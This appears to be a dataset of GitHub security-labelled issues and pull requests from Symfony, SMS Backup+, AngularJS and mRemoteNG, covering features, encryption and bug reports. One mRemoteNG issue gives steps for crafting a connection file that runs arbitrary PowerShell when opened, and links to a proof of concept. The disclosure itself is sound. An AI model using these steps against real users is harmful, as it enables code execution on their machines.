To make remember me cookie work I send `_remember_me` parameter as a query parameter `POST /api/login?_remember_me=true`. 
If your `remember_me_parameter` is set to `_remember_me` RememberMe service will do something like `$request->get('_remember_me')` which checks query parameters as well. > To make remember me cookie work I send `_remember_me` parameter as a query parameter `POST /api/login?_remember_me=true`.

Sure, this also works. Just another workaround for getting the value into the RememberMeHandler. You mix query params and JSON POST body whereas I prefer all data in one place (which then requires more code logic).

But nonetheless both versions still are workarounds. I don't really get why this feature is by default only available to FormLogins (since Symfony utilizes a cookie based session on JsonLogin anyway so a stateless argument wouldn't really count).

Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?> Thank you for this suggestion. There has not been a lot of activity here for a while. Would you still like to see this feature?

sureThe event based workaround is not bad, but it would be nice to cafe this built in. Just not sure if this is such high priority.",no,"Security,Feature,"
symfony/symfony,896993278,"[Security] Add an option to allow path instead of service for firewalls entry points (#39520)","| Q             | A
| ------------- | ---
| Branch?       | 5.4
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | no
| Tickets       | Fix #39520
| License       | MIT
| Doc PR        | 

Hi, this PR aims to fix #39520. It creates a new option in the firewall configuration section ""entry_point_path"", allowing to have a common entry point using a route instead of a service id.

Thanks !
","Hey!

I think @edefimov has recently worked with this code. Maybe they can help review this?

Cheers!

CarsonbotTests fixedCould we make `entry_point` accept a path instead of adding a new option?Hi,

following the previous comment of @chalasr, we can not decide on what to do : **do we keep the current option** `entry_point` which will now be either an entrypoint, a service or a path. Or **should we add a new option** like `entry_point_path` to handle the path option and activate the new `PathAuthenticator` ? 

The first one allows to **not add a new option**, which is nice, but can be a **bit complicated to read and debug**. The second is **clearer**, but it **add a new option** and there is already a lot of option in the security.

Do you have an opinion on the topic ?

Thank you very much !@chalasr see https://github.com/symfony/symfony/issues/39520#issuecomment-749837057 . I think the `entry_point` already allows too much magic strings representing all sorts of things. I'm not sure if adding yet another magic string would be good.",yes,"Security,Feature,Status: Needs Work,"
symfony/symfony,1258794926,"[SecurityBundle] Configure Voter priority via getDefaultPriority","| Q             | A
| ------------- | ---
| Branch?       | 6.2
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | no
| Tickets       | Fix #43074
| License       | MIT
| Doc PR        | Will do if PR gets approval

The issue describes well the missing feature. Solution is based on https://github.com/symfony/symfony/issues/43074#issuecomment-998045430 As mentioned in https://github.com/symfony/symfony/issues/43074#issuecomment-1050070069 it can be solved with PHP attributes already. If this became obsolete, feel free to close it.","Hey!

I think @NicoHaase has recently worked with this code. Maybe they can help review this?

Cheers!

Carsonbot> We can also use #[Autoconfigure(tags: [['security.voter' => ['priority' => 3000]]])] but what about adding a #[AsVoter(priority: 3000)] attribute to make it easier ?

I like this proposal about `#[AsVoter]` actually. Would you be up to give it a try?
I feel like we could even deprecate these static methods in favor of attributes now.
Oh, reading the source, I figured out we already have an attribute for that: `#[AsTaggedItem(priority: 100)]` would work equally well.
Can you update the PR and its test cases to use+mention this attribute instead of `getDefaultPriority()`? I'm going to suggest deprecating this method in a follow up PR.",yes,"Feature,SecurityBundle,Status: Needs Review,"
symfony/symfony,754570674,"[Security] Login link: Encrypt username","| Q             | A
| ------------- | ---
| Branch?       | 5.x for features
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | no
| Tickets       | 
| License       | MIT
| Doc PR        | 

The current implementation of a ""magic link"" uses the following query parameters: ""hash"", ""user"" and ""expires"". This is fine but it leaves the username exposed to the world. It could arguable be fine to send an url like this to **foo@example.com**:

> https://app.com/magic?user=foo@example.com&expires=123&hash=xxxxxx

However, if the `UserInterface::getUsername()` does not return an email, but an other id, like a auth0 id. Im not sure it is a good idea to show publicly.

This PR uses sodium to do a symmetric encryption of the username. 

Potential improvements: 
- Make this opt-in or opt-out
- Move the logic to a new class
- Use sodium to encrypt the hash or the full query string","Do we need to provide a layer that accepts the old links?hi @Nyholm I was reviewing your PR and found a couple of potencial bugs and I took the liberty to propose you a PR on your repo, you can find it at https://github.com/Nyholm/symfony/pull/10

for me anyway, +1 to use Sodium to encrypt the full query string, in order to have links like `login_check?code=[encrypted JSON of user, has, expiration, etc...]`Thank you. I agree with your changes. 

I'll do some more work on this PR to make sure we can do this change and still keep BC. @Nyholm glad I helped in some way :) I'm looking into the tests, because it should have been caught I guess.

Feel free to ping me if you want me to do somethingGive me 30 minutes to push some new changes. I would be happy to hear your opinions about them. @Nyholm it's taking shape, let me know if you want to delegate implementing tests, cheersI removed all encryption stuff to rely on a third party package instead. 

I moved the encryption stuff to https://github.com/symfony/symfony/pull/39344> Do we need to provide a layer that accepts the old links?

I don't think that's a good idea, better to request a new link to than to support an old ""insecure"" link.Hi @Nyholm! What is the status here? It seems like it has sort of stalled, although the changes seem to be complete. Is this ready to vote/merge?",yes,"Security,Feature,Status: Needs Review,"
jberkel/sms-backup-plus,313996152,"Support manually added certificates","See #839 


> Just chiming in quickly here, because I noticed that SMS  Backup+ changed its behaviour and stopped syncing for me with the last  backup. I use CAcert.org certificates (for now), and those are not in  the ""official"" trust chain, but I imported them manually into Android.  That works fine for K9 Mail, but it stopped working for SMS Backup+



",,no,"feature-request,security,"
jberkel/sms-backup-plus,499715467,"suppress 2FA security token messages","Many people use SMS for two-factor authentication, which means that forwarding SMSes with ""security codes"" into email considerably weakens overall security.

* If a GMail session can be intercepted (eg by leaving an unattended GMail session on a public computer), the attacker can receive the 2FA codes and thereby gain access to change settings on the account; in effect, taking ownership of it.
* A compromised GMail account could be leveraged to gain access to other services that are normally protected by 2-factor authentication.

I suggest checking the content of each message against a list of (regex?) patterns, and if any matches, then the message won't by copied into GMail.

There should be a default list provided with the app that includes:

    /your .*(authentication|security|bank) (code|password|token)/i

which in particular must match

    Your GMail security code is 123456

I'm open to whether users should be able to edit the list, but if they attempt to save an empty list, or otherwise disable this function, they should be subjected to a ""why this is a bad idea"" explanation. And they should have the option to ""add default patterns"".

If anyone knows an appropriate pattern for the 2FA SMS of any common Social Media, Financial, or Government service, please add details in a comment, either as a regex, or as an example of an actual SMS.

_(added)_
It should also be possible to suppress backing up messages based on the sender's phone number.

_(added 2)_
To avoid needing a UI to manage a blacklist, simply have a custom contacts label that prevents backing up messages from the numbers of those contacts.","Suggested warning:

## 2FA Token Suppression
Disabling this option weakens the two-factor authentication on your GMail account, and may enable an attacker to steal your account. Are you sure you want to disable *2FA token suppression*?Those codes have a time period in which they can be used, often a very short one. 
It would only be a (kind of) problem if the attacker received the code before the user That means that this app would have to backup the sms immediately after it was received. This app doesn't support that. The automatic backup feature has a minimum of 30 minutes between backups.
Even if it had the option to backup as soon as the sms was received. The attacker would have to know beforehand that the user was about to login to a specific website and more importantly, he would also need that specific login session, because if he tried to login to the website that issued the code, he would just trigger another code request.
And you are missing the most important point. If he had access to the email account, he could easily reset every password of any website linked to that account without needing the 2fa codes. And if that was the email where the owner saves his sms's, it's probably safe to assume that its his main email.Is there any benefit to *not* implementing this suggestion?

The point is not that there's an active threat *now*; the point is to apply defence in depth, and avoid contributing to a threat in the future if any of the existing assumptions cease to apply. (Failure to apply that maxim is what lead to widespread ""cross site scripting"" attacks, for example.)

Many assumptions simply reveal a lack of imagination:
* Of course an attacker can easily get the SMS before the user, if the user is: asleep; taking a break from tech; in a meeting with do-not-disturb; or just too busy to check every arriving SMS.
* The *default* timer is 30 minutes, but it can be set as short as 1 minute (and #944 would reduce that to 5 seconds). But even without changing that setting, because the timer implements a (very slow) version of Nagle's algorithm, it's still possible that a message could be copied to Gmail moments after it arrives.

Some assumptions are wrong because they assert universality, and ignore exceptions:
* You can't change the 2FA settings on a Google account itself without using (one of) the existing 2FA's. The same is true of any reasonable implementation of 2FA, such as those used by most banks and financial institutions. (Just because most other sites are already weak doesn't mean that we should contribute to weakening the stronger ones.)

Just because this is *unlikely* to make the difference between ""safe"" and ""compromised"" on any given attempt or for any given user does *not* mean the threat should be ignored. PlayStore says this app has 64500 users, so if future a chain of attack becomes viable at a ""1 chance in 10,000"" level, six of us will be compromised.

Of course there are other ways to mitigate the threat, but most of them require the user to make a complex assessment of their exposure. This suggestion is a comparatively easy point-fix that would avoid the end-user having to understand the nuances of their other decisions.>The default timer is 30 minutes, but it can be set as short as 1 minute

You're right, i didn't check properly.

In my last post i completely forgot that it can be the attacker the one who requests the codes. I was only thinking about the cases where the owner is about to login to a specific website and requests a code (which to be honest, doesn't make much sense now that i think about it).

Anyway, implementing this seems to be rather hard (or time consuming)  because you would have to make regex patterns for every language that a specific website uses. Unless of course you think that english speaking users are the only ones that deserve to be ""protected"" :P
Perhaps the user could add a specific phone number to a black list of numbers that won't be backed up. It's far from being perfect but i think users that are not tech savvy would prefer that compared to adding their own regex expressions.Fair point about languages; put it on the translation task list.

The user doesn't need to ""know about regex"", as they can just enter a literal string and that is automatically a regex that matches itself (provided it doesn't contain certain key punctuation).

I did initially consider suppression based on phone numbers, and it would certainly help, but in some places (like here in Australia) it's common to use a cellular gateway that shares/recycles the same pool of originating cellphone numbers between all the gateway's customers. Based on the collision rate, they appear to have a pool of many hundred phone numbers, which would be impractical to suppress.)

(Personally I think that's broken: I've had ""the same phone number"" send me appointment reminder messages from both my dentist and my doctor. When I complained to the dentist, their attitude was ""well that's the service we use"", rather than ""oh that's a problem we should fix"". Fortunately my doctor and dentist are only about 0.2 km apart, so when I turned up at the wrong one, I could quickly walk to the other one.)#254 and #892 already suggest blocking based on phone numbers, and the former has an abbreviated form of the same rationale as I've given above.

So I would support that as an option here.This issue is almost identical to #657 but there has been more discussion here.Additional/alternative suggestion: block recording of messages where the sender matches a contact that has a nominated label.

(That might mean checking more than one possible matching contact.)",no,"feature-request,security,"
jberkel/sms-backup-plus,316608883,"Self-signed certificates: Support Trust on first use","**Background**
There was some discussion in #839, on how to avoid unnoticed man-in-the-middle attacks (MITM) for connections using self-signed certificates. One suggested solution is documented in #875. Another suggestion was ""trust on first use"" (TOFU).

**User Story**
As user syncing to a server using a self signed cert, I like to get notified if the cert changes, to avoid unnoticed MITM.

**Acceptance criteria**
* SMS Backup+ shows a warning when connecting to a server which uses a certificate not signed by a trusted CA
* The user can chose to trust this cert or abort the connection
* The warning contains the necessary information (fingerprint of cert, server name, ...) to allow for an informed decision.  
* Further connections to the same server succeed silently, if the cert was trusted
* If the cert changes to a cert which is not signed by a trusted CA, the same warning is shown as above. 



",,no,"feature-request,security,"
angular/angular.js,96775612,"ngSanitize-ed content fetches external resources (img[src])","For some applications like email clients, it's important that the interaction with the sanitized content is not signaled via external http requests.

The sanitizer today doesn't take this requirement into account and allows external content to be fetched.

We should do one of:
- implement a mode where the external resources are stripped from the sanitized content
- document this behavior and point to alternative more fully-featured sanitizers that are more suitable for these applications
",,no,"frequency: low,severity: security,severity: confusing,"
mRemoteNG/mRemoteNG,1220183222,"Nightly build 1.77.2 on Windows 11 does not encrypt the connection file","The nightly build 1.77.2 on Windows 11 does not encrypt a password secured connection file.
Although enabled in Options -> Security -> Completely encrypt connection file
- Encryption Engine = AES
- Block Cipher Mode = GCM
- Key Derivation Function Iterations = 1000

When the password is removed, the connection file gets encrypted.

When you add a password after encryption, it works.
 ",,no,"Need 2 check,Security,1.77.3,"
mRemoteNG/mRemoteNG,1196609385,"Crafted XML File Code Execution","It is possible to craft a connection that executes arbitrary PowerShell commands when it is double-clicked. This is problematic because an attacker could export a code-executing connection and then trick someone into importing and clicking on it, allowing the attacker to execute code on their machine. The root of the issue is this piece of code that is used for making PowerShell connections:

![image](https://user-images.githubusercontent.com/29503289/162325436-c75e93dc-7ab3-4e49-b30d-4ccf73dc4a0e.png)

Here is a PoC XML file: https://pastebin.com/DDYYFuPs

You can create your own .xml file by following these steps:

1.	Create a new connection using the PowerShell protocol.
2.	Set the host of the connection to 127.0.0.1
3.	Set the password of the connection to an evil payload containing PowerShell script.
4.	Export the resulting connection to an .xml file.


Here is a video of PoC in action:

https://www.youtube.com/watch?v=HB0VZyH62es

In order to fix this you need to escape the password before using it in this way to ensure that the contents of the password aren’t interpreted as code. This issue was found in your v1.77.3-dev branch but likely effects users.


Also, security@mremoteng.org is rejecting my emails. I would have preferred not to disclose this without notifying the devs ahead of time.


@sparerd @kmscode @kvarkas @farosch","thanks for such, will try to think what we can implement to defend ourselves from such potential usages",no,"Verified,Security,PowerShell,1.77.3,"
mRemoteNG/mRemoteNG,1174320108,"Idea: allow Windows Account for encryption (Data Protection API/DPAPI)","one cool option in my opnion would be that rather than using a password for encryption to use the windows account's possibilities for securing stuff itself, similar to what keepass can do https://keepass.info/help/base/keys.html at Windows User Account
This Also at least seems secure as it apparently relies on a windows account being properly unlocked (e.g. resetting your password will grill the keys used and make the data inaccessible, so a warning would be good.)
While this make the file less portable (obviously) the question is whether the connection file especially regarding passwords needs to be that portable in all use cases especially if a password manager is used in fact already. in fact especially considering that with DPAPI the windows password is part of the generation so it's a ton easier to enforce security on those, and obviously also more convenient since only one login is needed.

## Expected Behavior
basically when encrypting to allow an option between password, Win Account or perhaps even both for the people who want even stronger security.

## Current Behavior
Currently you can only use a password to encrypt the connection file.

## Possible Solution
might be possible to look at how keepass does it.



## Context
I would have thought it could be a good way to improve security in a way that wouldnt hurt most people (and the others dont have to enable it just like with the current encryption)","I like this idea. And if only the credentials are encrypted, the file should be portable to a degree, only the passwords would need to be re-entered (which shouldn't pose any issues except usability)I dont know how the encryption works if it only crypts creds or everything but if it only crypts creds that would be an absolute masterpieceI just know this kind of encryption from the ""Microsoft Remote Desktop Manager"" which had it implemented like that. And every time something was wrong with the user, I just had to re-enter the password once and everything was fine again. 

The current implementation of mRemoteNG is just a way to obfuscate the settings, but (as far as I know) does not protect the credentials directly. That should be possible to implement once profiles will go live, currently working towards suchcool, looking forward to it.",no,"Enhancement,In development,Security,"
mRemoteNG/mRemoteNG,1227580249,"RSA-SSH key error connecting to ubuntu 2204","When connecting to a Ubuntu 2204 server with mremoteng (build 1.76.20.24615) using a RSA-SSH key imported in Peagent we get an error.


## Expected Behavior
When using a saved putty session with a SSH key we connect to Ubuntu servers
On Ubuntu servers 20.04 we can connect using this saved session.
We want to use this saved session to connect with Ubuntu 22.04 servers as well 

## Current Behavior
When trying to connect to a Ubuntu 22.04 server we get an error.
In auth.log on the server the following error is reported:
_No supported authentication methods available [preauth]
do_cleanup [preauth]_

When connecting with Putty in stead of MremoteNG the connection using SSH is working as aspected

## Possible Solution
Adding the following line to /etc/ssh/sshd_config
_PubkeyAcceptedAlgorithms +ssh-rsa_
will resolve the issue

## Context
we would like to be able to connect with MremoteNG to the Ubuntu 22.04 servers using the SSH key without having to put the extra line in sshd_config

## Your Environment
* Version used: 1.76.20.24615
* Operating System and version (e.g. Windows 10 1709 x64): Windows server 2016, Windows server 2019, Window 10, Windows 11
","This is affecting us.  Bumping this issue.Maybe you try replacing puttyng.exe with the one from last nightly build or with the original putty.exeyou need generate new key ssh and use nightly for support new key format
https://askubuntu.com/questions/1409105/ubuntu-22-04-ssh-the-rsa-key-isnt-working-since-upgrading-from-20-04@Kvarkas can you please give an update to this issue for stable or even preview?   Our company has multiple team members that are using mRemoteNG.  > @Kvarkas can you please give an update to this issue for stable or even preview? Our company has multiple team members that are using mRemoteNG.

@swiedeman New builds are on it's way, if 1.77.2 is not stable enough for you you have the option to replace the putty.exe in the mRemoteNG program folder through a newer one. 

If you would like to support and speed up the software development, then please consider a donation > 

Appreciate the reply and the workaround!!   We can wait for 1.77.2.   I did replace the PuTTYNG.exe with the latest Putty executable and that does work. 
   hey ho, jut come back after holidays, will have a look into this as priority ",no,"In progress,SSH,Security,"
mRemoteNG/mRemoteNG,529496652,"SQL Connections: Don't ask for custom password after every change is done.","

## Expected Behavior

Only ask for custom encryption password for connections at startup time.

## Current Behavior

When using SQL Server connections (tested on MySQL), after every change password is asked in a new popup window. This is quite annoying.

But what is more annoying is that if from another session someone doesn't enter the custom password (pop-up password window loose the focus) and make any change, previous change are lost.


## Possible Solution
Store custom encryption password in memory and use it when instance detect some DB connections change.

## Steps to Reproduce (for bugs)

1. Open to instances connected to same database.
2. Set custom encryption password for connections
3. Add new connection or modify existing connection


## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->
* Version used: 1.77.0.41307 Portable Edition
* Windows 10 1909 x64
",,no,"Need 2 check,Security,DBs,"
mRemoteNG/mRemoteNG,995201005,"Trouble using key-based authentication with external tools","## Expected Behavior
I'm trying to configure WinSCP external tool, but a 2nd profile that uses keys instead of passwords. In my searching, looks like this has been brought up once before http://forum.mremoteng.org/viewtopic.php?f=3&t=1701 but they did not find a solution. I did not find many other results for this, surprisingly.

## Current Behavior
Using the provided configuration, I get the error `No supported authentication methods available (server sent: publickey,gssapi-keyex,gssapi-with-mic)` This occurs be because the external tool uses the command to send a password, but only key-based authentication is supported. 

## Possible Solution
Add variable support for ""PuTTY Session"" field. Maybe this variable exists and is not documented? I have checked here https://mremoteng.readthedocs.io/en/latest/user_interface/external_tools.html#variables

WinSCP CLI does have support for providing a key file, as can be seen here https://winscp.net/eng/docs/commandline
`winscp.exe scp://test@example.com:2222/ /privatekey=mykey.ppk`
The problem is, if we use the ""External Tools"" interface to define a key file in the arguments, then it will only work for sessions that support that specific key file. The better option would be to define the key path in a variable so that it(mremote or external command) can pull the information via the session configuration. 

I'm not entirely sure of the functionality of ""PuTTY Session"" field, but I believe this may contain more information than the key file path. Perhaps this field as a variable would not work, and we need a new variable and field to define a key path, so that can be used in external commands and otherwise. 

To be sure, I have tested the following configuration:
```
Display Name: WinSCP key-based authentication
Filename: winscp
Arguments: scp://%Username%@%Hostname%/ /privatekey=C:\Users\<username>\.ssh\<key_file_name>.ppk
```

## Steps to Reproduce (for bugs)
1. Configure WinSCP as an external tool according to https://mremoteng.readthedocs.io/en/latest/external_tools_cheat_sheet.html
2. Launch the external tool via right-click on the key-based session, which otherwise connects correctly via SSH2

## Context
Hmm, I'm not sure what else to add. My use-case is to open an sftp session in Windows via WinSCP, since the built-in SSH file transfer tool appears to be a bit clunky compared to competitive or external tools (man, it would be nice to have an ""sftp panel"" like MobaXTerm, in mRemoteNG!). The only issue is that I'm trying to do this via key file, which is becoming increasingly popular, so I'd like to see mRemoteNG support this method of authentication for external tools and other places that variables can be used. Then, we could add an optional configuration to the WinSCP external tools documentation to advertise support for this feature. 

## Your Environment
* Version used: 1.76.20.24669 portable
Windows 10 20H2",,no,"Security,Improvement required,Third party,"
mRemoteNG/mRemoteNG,353842362,"Passwords Exported in ClearText (.csv)","When exporting connections using the .csv, the password is displayed in clear text.  The doesn't occur when exporting to .xml.

To reproduce on Windows 10 build (1803):
1.  Select File, Export to File.
2.  Select the file format for .csv.
3.  Export and open file.  ","There is really no way for us to export and then re-import encrypted text using csv format in a nice way. We need to provide a number of details in the .xml format to tell mRemoteNG how to decrypt it. If we do the same in csv format, we need to include that data in every row of the csv. If we provide the encrypted value but no indication of how it was encrypted, then it will be essentially impossible to decrypt it. Why provide the value at all, at that point?

Maybe we should provide a large warning when exporting CSV with the `Password` field selected? That way it is very obvious that unsecure stuff is about to happen. Maybe even unselect the `Password` field by default so it doesn't accidentally get included?For that matter, the external tools window should provide a similar warning when tools include the `%Password%` variable. It would be good practice for us to warn users about these clear text password situations.Thanks for the response!  I appreciate your hard work and a great product.",no,"Security,Connections,"
mRemoteNG/mRemoteNG,368724574,"export and import with encryption","<!--- Provide a general summary of the issue in the Title above -->

## Expected Behavior
When exporting your settings/site connections have an option where you can export with a password encrypted file. I wanted to keep my sites in an export on my google drive until I realized both CSV and XML options left the passwords out in plain text in the file.

## Current Behavior
Exports Site settings in plain text.

## Possible Solution
1. Add an option to encrypt with a password, even if it just uses something like an archive protocol to wrap the plaintext file. and then encrypt Encrypting is so easy these days no reason not too with how many libraries and ways to achieve it.

2. Secondarily this probably should apply when saving individual site connections as a file as well.
3. After this was completed, it would be nice simply point mremoteng at a url of my settings file, or to work with google drive / drop box to have a unified settings file stored in the cloud.

## Context
Right now I'm using a small python utility kept in the same folder to temporarily decrypt the file for import, and then encrypt again after, or when updating.

## Your Environment

* Windows 10
* Version used:  1.76.9 (2018-10-07)
","Why not use the normal saving functionality? It encrypts passwords, offers full-file encryption, and can be saved anywhere (including google drive/dropbox folders).

Are you using the export more like a backup feature?",no,"Need 2 check,1.77.2,Needs implementation,Security,"
mRemoteNG/mRemoteNG,821875505,"How do retrieve password when terminal prompt the user to write password!","When you do any thing need sudo permission the terminal will ask you write password again, but when click on passowrd field and try to copy it does not work

## Expected Behavior
I can copy the password and for security considerations , mRemoteNG  ask me again to write master password.
I miss this feature that was in the popular remote connection manager [PAC Manager](https://sourceforge.net/projects/pacmanager/)
","I think this will need repalce current putty with a custom erminal emulator which allow mRemoteNG send pwd to it.see my comment here: https://github.com/mRemoteNG/mRemoteNG/issues/2193#issuecomment-1146343983",no,"Enhancement,UI/UX,Security,"
mRemoteNG/mRemoteNG,263871264,"Feature Request: Save Connection","<!--
Only file GitHub issues for bugs and feature requests.  All other topics will be closed.

Before opening an issue, please search for a duplicate or closed issue.
Please provide as much detail as possible for us to fix your issue.
-->
Security option.
If the connections are stored in SQL.
Remove the Save As menu item.


<!-- Security option.
If the connections are stored in SQL.
Remove the Save As menu item.-->
<!-- If you file a feature request, please delete the bug section -->
",,no,"Enhancement,Security Vuln,"
mRemoteNG/mRemoteNG,732275226,"Security: CVE-2020-0765 | Remote Desktop Connection Manager Information Disclosure Vulnerability","## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->
Remote Desktop Connection Manager is affected by a information disclosure vulnerability, as we can see in the article description: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0765

Is it possible to get to know or evaluate if mRemoteNG is also affected by this vulnerability?

## Possible Solution
<!--- Not obligatory, but suggest a fix/reason for the bug, -->
<!--- or ideas how to implement the addition or change -->
If vulnerable, update the libraries to overcome this issue and implement measures to prevent XML External Entities (XXE)

## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->
Just trying to understand if mRemoteNG is also vulnerable to this Information Disclosure issue.
",,no,"High Priority,Security Vuln,RDP,"
mRemoteNG/mRemoteNG,401502909,"Object reference not set to an instance of an object","<!--- Provide a general summary of the issue in the Title above -->

I had mremoteng 1.76.11 installed, connected to a database and working fine. it was then pointed out to me that it was saving the passwords in plain text. 
So I upgraded to 1.76.13 and I get the message 'Object reference not set to an instance of an object'.
I have tried to uninstall mremote, delete the folders in AppData and run a registry cleaner and then reinstalling.

## Expected Behavior
mremote should connect to the database and let me use connections in it - passwords should be encrypted



## Steps to Reproduce (for bugs)

1.Install 1.76.11
2.Connect it to a database
3.upgrade to 1.76.13
4.Try to connect to a database again



## Debug Error log

See the end of this message for details on invoking 
just-in-time (JIT) debugging instead of this dialog box.

************** Exception Text **************
System.NullReferenceException: Object reference not set to an instance of an object.
   at mRemoteNG.Config.Connections.SqlConnectionsLoader.GetDecryptionKey(SqlConnectionListMetaData metaData) in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\Config\Connections\SqlConnectionsLoader.cs:line 61
   at mRemoteNG.Config.Connections.SqlConnectionsLoader.Load() in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\Config\Connections\SqlConnectionsLoader.cs:line 45
   at mRemoteNG.Connection.ConnectionsService.LoadConnections(Boolean useDatabase, Boolean import, String connectionFileName) in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\Connection\ConnectionsService.cs:line 121
   at mRemoteNG.UI.Forms.OptionsPages.SqlServerPage.ReinitializeSqlUpdater() in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\UI\Forms\OptionsPages\SqlServerPage.cs:line 82
   at mRemoteNG.UI.Forms.OptionsPages.SqlServerPage.SaveSettings() in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\UI\Forms\OptionsPages\SqlServerPage.cs:line 71
   at mRemoteNG.UI.Forms.frmOptions.btnOK_Click(Object sender, EventArgs e) in C:\jenkins\workspace\Publish\Build mRemoteNG for Release\mRemoteV1\UI\Forms\frmOptions.cs:line 112
   at System.Windows.Forms.Control.OnClick(EventArgs e)
   at System.Windows.Forms.Button.OnClick(EventArgs e)
   at System.Windows.Forms.Button.OnMouseUp(MouseEventArgs mevent)
   at System.Windows.Forms.Control.WmMouseUp(Message& m, MouseButtons button, Int32 clicks)
   at System.Windows.Forms.Control.WndProc(Message& m)
   at System.Windows.Forms.ButtonBase.WndProc(Message& m)
   at System.Windows.Forms.Button.WndProc(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)
   at System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)


************** Loaded Assemblies **************
mscorlib
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3260.0 built by: NET472REL1LAST_C
    CodeBase: file:///C:/Windows/Microsoft.NET/Framework/v4.0.30319/mscorlib.dll
----------------------------------------
mRemoteNG
    Assembly Version: 1.76.13.1186
    Win32 Version: 1.76.13.1186
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/mRemoteNG.exe
----------------------------------------
System
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3314.0 built by: NET472REL1LAST_B
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System/v4.0_4.0.0.0__b77a5c561934e089/System.dll
----------------------------------------
System.Configuration
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Configuration/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Configuration.dll
----------------------------------------
System.Core
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3221.0 built by: NET472REL1LAST_C
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Core/v4.0_4.0.0.0__b77a5c561934e089/System.Core.dll
----------------------------------------
System.Drawing
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Drawing/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Drawing.dll
----------------------------------------
System.Windows.Forms
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3221.0 built by: NET472REL1LAST_C
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Windows.Forms/v4.0_4.0.0.0__b77a5c561934e089/System.Windows.Forms.dll
----------------------------------------
System.Xml
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Xml/v4.0_4.0.0.0__b77a5c561934e089/System.Xml.dll
----------------------------------------
WeifenLuo.WinFormsUI.Docking
    Assembly Version: 2.16.0.0
    Win32 Version: 2.16.0.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/WeifenLuo.WinFormsUI.Docking.DLL
----------------------------------------
mRemoteNG.resources
    Assembly Version: 1.76.13.1186
    Win32 Version: 1.76.13.1186
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/en-US/mRemoteNG.resources.DLL
----------------------------------------
WeifenLuo.WinFormsUI.Docking.ThemeVS2003
    Assembly Version: 2.16.0.0
    Win32 Version: 2.16.0.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/WeifenLuo.WinFormsUI.Docking.ThemeVS2003.DLL
----------------------------------------
WeifenLuo.WinFormsUI.Docking.ThemeVS2012
    Assembly Version: 2.16.0.0
    Win32 Version: 2.16.0.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/WeifenLuo.WinFormsUI.Docking.ThemeVS2012.DLL
----------------------------------------
WeifenLuo.WinFormsUI.Docking.ThemeVS2013
    Assembly Version: 2.16.0.0
    Win32 Version: 2.16.0.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/WeifenLuo.WinFormsUI.Docking.ThemeVS2013.DLL
----------------------------------------
WeifenLuo.WinFormsUI.Docking.ThemeVS2015
    Assembly Version: 2.16.0.0
    Win32 Version: 2.16.0.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/WeifenLuo.WinFormsUI.Docking.ThemeVS2015.DLL
----------------------------------------
System.Xml.Linq
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Xml.Linq/v4.0_4.0.0.0__b77a5c561934e089/System.Xml.Linq.dll
----------------------------------------
MagicLibrary
    Assembly Version: 1.7.4.0
    Win32 Version: 1.7.4.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/MagicLibrary.DLL
----------------------------------------
log4net
    Assembly Version: 2.0.8.0
    Win32 Version: 2.0.8.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/log4net.DLL
----------------------------------------
BouncyCastle.Crypto
    Assembly Version: 1.8.1.0
    Win32 Version: 1.8.15362.1
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/BouncyCastle.Crypto.DLL
----------------------------------------
System.Management
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
